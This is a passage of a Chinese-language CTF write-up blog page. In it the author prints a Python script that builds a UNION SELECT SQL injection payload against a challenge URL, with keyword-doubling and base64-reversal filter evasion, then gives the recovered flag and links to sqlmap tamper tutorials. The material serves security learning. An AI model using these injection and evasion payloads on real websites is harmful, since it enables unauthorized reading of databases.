+<p>由于后面查表的时候不知道过滤了什么，反正就是查不到，一直报错，所以这个tamper实际上并没有起到什么作用，我只是跑出来id是注入点，后续并没有跑出来数据。<br>所以这个经历告诉我们，知识和技巧很重要，后面要补一补这方面的知识。<br>无奈，我后面只能通过这些payload手动进行注入了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"http://47.103.43.235:83/web/a/index.php?id=1 union select 1,2,3,4,5,flag from flag"</span></span><br><span class="line"></span><br><span class="line">payload = payload.replace(<span class="string">' '</span>, <span class="string">'/**/'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'or'</span>, <span class="string">'Oorr'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'where'</span>, <span class="string">'whwhereere'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'union'</span>, <span class="string">'ununionion'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'select'</span>, <span class="string">'selselectect'</span>)</span><br><span class="line">payload = payload.replace(<span class="string">'and'</span>, <span class="string">'Aandnd'</span>)</span><br><span class="line">site = payload.find(<span class="string">'='</span>)</span><br><span class="line">end = payload[site+<span class="number">1</span>:]</span><br><span class="line">bs64 = base64.b64encode(end)</span><br><span class="line">rebs64 = bs64[::<span class="number">-1</span>]</span><br><span class="line">payload = payload[:site+<span class="number">1</span>] + rebs64</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"><span class="comment">#ctf_sql</span></span><br></pre></td></tr></table></figure></p>
+<p>将payload经过一系列变换，手动提交payload进行注入… 因为爆不出表名，索性直接就<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select flag from flag</span><br></pre></td></tr></table></figure></p>
+<p>最后得到flag：flag{s9li_1s_s0_e4sY}  </p>
+<p>sqlmap的tamper学习链接：  </p>
+<ul>
+<li><a href="https://www.smi1e.top/sqlmap-tamper%E7%BC%96%E5%86%99/" target="_blank" rel="noopener">https://www.smi1e.top/sqlmap-tamper%E7%BC%96%E5%86%99/</a>  </li>
+<li><a href="http://www.myh0st.cn/index.php/archives/881/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/881/</a>  </li>
+<li><a href="https://www.jianshu.com/p/c24727dd1f7a" target="_blank" rel="noopener">https://www.jianshu.com/p/c24727dd1f7a</a>  </li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这可能是我做的最好的一次ctf了吧，题比较简单，适合我这种萌新做，主要就是有的脑洞太大，我这脑壳有点跟不上。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+  </section>
+
+  
+
+
+          </div>
+          
+
+
+          
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">故人梦</p>
+              <p class="site-description motion-element" itemprop="description">人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">故人梦</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
